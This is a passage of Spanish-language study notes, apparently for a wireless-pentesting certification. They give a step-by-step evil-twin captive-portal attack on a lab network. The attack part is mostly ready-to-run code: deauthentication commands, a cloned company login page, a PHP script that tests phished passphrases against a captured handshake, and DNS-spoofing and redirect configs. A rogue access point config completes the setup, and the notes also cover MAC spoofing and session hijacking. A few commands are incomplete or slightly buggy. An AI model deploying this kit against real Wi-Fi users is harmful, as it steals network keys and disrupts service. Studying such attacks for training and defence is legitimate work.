
# OSWP Unit 10: Attacking Captive Portals – Cheatsheet
What is a Captive Portal?

A web page that users must interact with (e.g., authentication, accept T&Cs) before accessing the internet.
Common in public Wi-Fi (hotels, cafes, airports).
The portal usually intercepts HTTP/HTTPS requests and redirects them to the login page.

### Attack Goals

1. Bypass or defeat captive portal restrictions.
2. Obtain credentials.
3. Gain unrestricted internet access.
4. Perform session hijacking or MITM (Man-In-The-Middle).

### Typical Attack Flows
1. Reconnaissance

    - Identify target network with a captive portal.
    - Scan and gather info:
    - Identify the captive portal’s IP or gateway.
    - Determine the authentication mechanism.

2. Network Setup

   - Connect to the target AP (access point).
   - Configure your wireless card for appropriate mode (monitor, managed).

3. Captive Portal Detection Techniques

    Test HTTP connection: Try to access an external site, check for redirect.
    Use tools/scripts that detect redirection or captive portal signature.

4. Session Techniques

    - MAC spoofing
    - Spoof a MAC address of a user who already has access.
    - Command (Linux example):
    ```bash
    ifconfig wlan0 down
    macchanger -m <MAC_address> wlan0
    ifconfig wlan0 up
    ```
    - Session cookie hijacking:
       1. Capture session cookies with Wireshark or Bettercap.
       2. Use cookies to access internet without authenticating.

5. MITM Attacks

    - Use tools like Bettercap or MITMf to perform HTTP/HTTPS redirection and credential capture.
    - ARP spoofing to redirect traffic.

## Flow attack
> Usamos https://www.megacorpone.com/ como ejemplo
### Discovery

```bash
sudo airodump-ng -w discovery --output-format pcap wlan0mon
```
```bash
wireshark discovery-01.cap
```

>A modo de ejemplo usamos esta salida:

```bash
 BSSID              PWR  Beacons      Data  /s  CH   MB   ENC CIPHER  AUTH ESSID

 00:0E:08:FA:47:CD  -51        3        2    0   6  195   WPA2 CCMP   MGT  MegaCorp One
 00:0E:08:75:69:78  -70        2        0    0   1  130   OPN              MegaCorp One Guest
 00:0E:08:90:3A:5F  -75        3        0    0  11  130   WPA2 CCMP   PSK  MegaCorp One Lab
```
Ejecutamos el ataque contra "Megacorp One Lab"

### Deautenticamos

```bash
sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon
```
### Creacion del sitio. 

```bash
wget -r -l2 https://www.megacorpone.com
```
Creemos la página de inicio de sesión de nuestro portal cautivo, llamada index.php, en /var/www/html/portal

```bash
<!DOCTYPE html>
<html lang="en">

	<head>
		<link href="assets/css/style.css" rel="stylesheet">
		<title>MegaCorp One - Nanotechnology Is the Future</title>
	</head>
	<body style="background-color:#000000;">
		<div class="navbar navbar-default navbar-fixed-top" role="navigation">
			<div class="container">
				<div class="navbar-header">
					<a class="navbar-brand" style="font-family: 'Raleway', sans-serif;font-weight: 900;" href="index.php">MegaCorp One</a>
				</div>
			</div>
		</div>

		<div id="headerwrap" class="old-bd">
			<div class="row centered">
				<div class="col-lg-8 col-lg-offset-2">
					<?php
						if (isset($_GET["success"])) {
							echo '<h3>Login successful</h3>';
							echo '<h3>You may close this page</h3>';
						} else {
							if (isset($_GET["failure"])) {
								echo '<h3>Invalid network key, try again</h3><br/><br/>';
							}
					?>
				<h3>Enter network key</h3><br/><br/>
				<form action="login_check.php" method="post">
					<input type="password" id="passphrase" name="passphrase"><br/><br/>
					<input type="submit" value="Connect"/>
				</form>
				<?php
						}
				?>
				</div>

				<div class="col-lg-4 col-lg-offset-4 himg ">
					<i class="fa fa-cog" aria-hidden="true"></i>
				</div>
			</div>
		</div>

	</body>
</html>
```

#### Copiamos assets y otros

```bash
sudo cp -r ./www.megacorpone.com/assets/ /var/www/html/portal/

sudo cp -r ./www.megacorpone.com/old-site/ /var/www/html/portal/
```

#### Script de verificación de inicio de sesión

```bash
<?php
# Path of the handshake PCAP
$handshake_path = '/home/kali/discovery-01.cap';
# ESSID
$essid = 'MegaCorp One Lab';
# Path where a successful passphrase will be written
# Apache2's user must have write permissions
# For anything under /tmp, it's actually under a subdirectory
#  in /tmp due to Systemd PrivateTmp feature:
#  /tmp/systemd-private-$(uuid)-${service_name}-${hash}/$success_path
# See https://www.freedesktop.org/software/systemd/man/systemd.exec.html
$success_path = '/tmp/passphrase.txt';
# Passphrase entered by the user
$passphrase = $_POST['passphrase'];

# Make sure passphrase exists and
# is within passphrase lenght limits (8-63 chars)
if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
  header('Location: index.php?failure');
  die();
}

# Check if the correct passphrase has been found already ...
$correct_pass = file_get_contents($success_path);
if ($correct_pass !== FALSE) {

  # .. and if it matches the current one,
  # then redirect the client accordingly
  if ($correct_pass == $passphrase) {
    header('Location: index.php?success');
  } else {
    header('Location: index.php?failure');
  }
  die();
}

# Add passphrase to wordlist ...
$wordlist_path = tempnam('/tmp', 'wordlist');
$wordlist_file = fopen($wordlist_path, "w");
fwrite($wordlist_file, $passphrase);
fclose($wordlist_file);

# ... then crack the PCAP with it to see if it matches
# If ESSID contains single quotes, they need escaping
exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
" -w " . $wordlist_path . " " . $handshake_path, $output, $retval);

$key_found = FALSE;
# If the exit value is 0, aircrack-ng successfully ran
# We'll now have to inspect output and search for
# "KEY FOUND" to confirm the passphrase was correct
if ($retval == 0) {
	foreach($output as $line) {
		if (strpos($line, "KEY FOUND") !== FALSE) {
			$key_found = TRUE;
			break;
		}
	}
}

if ($key_found) {

 # Save the passphrase and redirect the user to the success page
  @rename($wordlist_path, $success_path);

  header('Location: index.php?success');
} else {
  # Delete temporary file and redirect user back to login page
  @unlink($wordlist_file);

  header('Location: index.php?failure');
}
?>
```

### Configuracion de red

1. Asignacion de ip a wlan0
```bash
sudo ip addr add 192.168.87.1/24 dev wlan0
```
* Qué hace: añade una dirección IPv4 estática a la interfaz. El sufijo /24 equivale a máscara 255.255.255.0 (red 192.168.87.0/24).

* Gotchas: si la interfaz ya tiene esa IP el comando fallará; NetworkManager o systemd-networkd pueden sobreescribirla. Usar el nombre correcto de interfaz (wlan0 puede variar, ej. wlp3s0).

* Activar la interfaz:
```bash
sudo ip link set wlan0 up
```
* Qué hace: sube la interfaz (equivalente a "encenderla"). Necesario para que empiece a responder en la red.
* Instalar dnsmasq (servidor DNS y DHCP liviano)

```bash
sudo apt install dnsmasq
```
3. Archivo de configuración mco-dnsmasq.conf — opciones clave (línea por línea)
* domain-needed
    * Evita que dnsmasq reciba consultas sin un dominio; reduce respuestas inútiles.
* bogus-priv
    * Descarta consultas hacia direcciones privadas que no deberían resolverse públicamente (más seguro).
* no-resolv
    * Ignora resolv.conf para resolución hacia upstream; indica que se usarán servidores DNS explícitos con server= si se requiere resolución externa.
    * Gotcha: sin server= no habrá resolución hacia Internet.
* filterwin2k
    * Filtra ciertas consultas generadas por máquinas Windows que pueden ser ruidosas.
* expand-hosts
    * Si se define domain=..., los nombres cortos entregados por DHCP se expanden a FQDNs (ej. cliente -> cliente.localdomain).
* domain=localdomain
    * Define el dominio local que dnsmasq añadirá a los hosts.
* local=/localdomain/
    * Hace que las consultas por ese dominio se resuelvan desde hosts locales (/etc/hosts y DHCP), no reenvíen fuera.
* listen-address=192.168.87.1
    * Hace que dnsmasq escuche solo en esa IP. Comentario en el archivo: si se escucha en una interfaz también escucha en localhost por defecto; al fijar la IP se restringe para evitar interferir con la resolución local.
    * Gotcha: si otra instancia de DNS ya usa esa IP/puerto 53 dará error. Asegurarse que puerto 53 esté libre.
* dhcp-range=192.168.87.100,192.168.87.199,12h
    * Rango DHCP que se entregará a clientes: desde .100 hasta .199; duración de leasing = 12 horas.
* dhcp-lease-max=100
    * Límite máximo de leases activas (coincide con el tamaño del rango).

4. Operaciones complementarias que normalmente se necesitan (no están en el fragmento)
* Reiniciar/recargar dnsmasq después de editar:

```bash
sudo systemctl restart dnsmasq
```
* Si los clientes necesitan acceso a Internet, habilitar reenvío IPv4 y NAT:
```bash
# Habilitar IP forwarding temporalmente
sudo sysctl -w net.ipv4.ip_forward=1

# Ejemplo básico de NAT (suponiendo que la conexión a Internet está en eth0)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
```bash
# mco-dnsmasq.conf
# Main options
# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
# Only listen on this address. When specifying an
# interface, it also listens on localhost.
# We don't want to interrupt any local resolution
# since the DNS responses will be spoofed
listen-address=192.168.87.1

# DHCP range
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100

# This should cover most queries
# We can add 'log-queries' to log DNS queries
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1

# Entries for Windows 7 and 10 captive portal detection
address=/dns.msftncsi.com/131.107.255.255
```
```bash
sudo dnsmasq --conf-file=mco-dnsmasq.conf
```
```bash
sudo tail /var/log/syslog | grep dnsmasq
```
Confirmamos conexiones DNS y DHCP en puertos 53
```bash
sudo netstat -lnp
```
Forzar la redirección de todas las solicitudes DNS

```bash
sudo apt install nftables
```
```bash
sudo nft add table ip nat
```
```bash
sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
```
```bash
sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53
```
En la configuración del sitio de Apache, necesitamos agregar las reglas mod_rewrite7 y mod_alias7:1 para que el portal cautivo se configure correctamente. Agregaremos las siguientes líneas en /etc/apache2/sites-enabled/000-default.conf antes de la etiqueta de cierre de VirtualHost.
```bash
# Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]

</VirtualHost>
```

```bash
sudo a2enmod rewrite
```

```bash
sudo a2enmod alias
```

```bash
<VirtualHost *:443>

  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html

  ErrorLog ${APACHE_LOG_DIR}/error.log
  CustomLog ${APACHE_LOG_DIR}/access.log combined

  # Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 https://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt https://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt https://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L]

  # Use existing snakeoil certificates
  SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem
  SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key
</VirtualHost>
```

```bash
sudo a2enmod ssl
```

```bash
sudo systemctl restart apache2
```

### Configuración y ejecución del punto de acceso no autorizado

Crearemos un punto de acceso 802.11n con el mismo SSID y canal que el punto de acceso objetivo, pero sin cifrado

```bash
interface=wlan0
ssid=MegaCorp One Lab
channel=11

# 802.11n
hw_mode=g
ieee80211n=1

# Uncomment the following lines to use OWE instead of an open network
#wpa=2
#ieee80211w=2
#wpa_key_mgmt=OWE
#rsn_pairwise=CCMP
```
Ejecutaremos hostapd en segundo plano, con -B
```bash
sudo hostapd -B mco-hostapd.conf
```
Supervisamo entradas en la primer terminal
```bash
sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'
```
Superisamos entradas en la segunda terminal
```bash
sudo tail -f /var/log/apache2/access.log
```
```bash
sudo find /tmp/ -iname passphrase.txt
```
```bash
sudo cat 
```

* Persistencia: escribir sysctl en /etc/sysctl.conf y reglas iptables en un script o usar nftables/systemd service.
5. Consejos y posibles problemas
* Conflicto con NetworkManager/other managers: bloquear la gestión de wlan0 si se configura manualmente, o usar la propia configuración del gestor de red.
* no-resolv implica que debes indicar upstream DNS con server=8.8.8.8 (o el DNS del ISP) para que los clientes resuelvan internet.
* Seguridad: un DNS/DHCP abierto puede ser usado por clientes maliciosos; restringir con firewall si hace falta.
* Ver logs con: `sudo journalctl -u dnsmasq -f` para depurar arranque y errores de binding en el puerto 53.
